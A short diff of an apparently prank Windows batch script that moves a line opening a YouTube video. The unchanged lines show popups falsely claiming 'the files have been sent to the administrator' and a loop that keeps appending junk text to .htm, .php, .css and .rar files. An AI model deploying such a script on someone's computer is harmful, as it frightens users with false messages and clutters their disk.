@@ -7,6 +7,7 @@ msg * espere un momento..
 msg * espere un momento...
 msg * los archivos han sido enviados al administrador correctamente
 set hoal = 1
+start https://youtu.be/uvXYYFO7h0Q
 :bucle
 :menu
 cls
@@ -35,7 +36,6 @@ echo xd>>%hoal%.htm
 echo xd>>%hoal%.php
 echo xd>>%hoal%.css
 echo xd>>%hoal%.rar
-start https://youtu.be/uvXYYFO7h0Q
 goto menu
 goto bucle
 cls
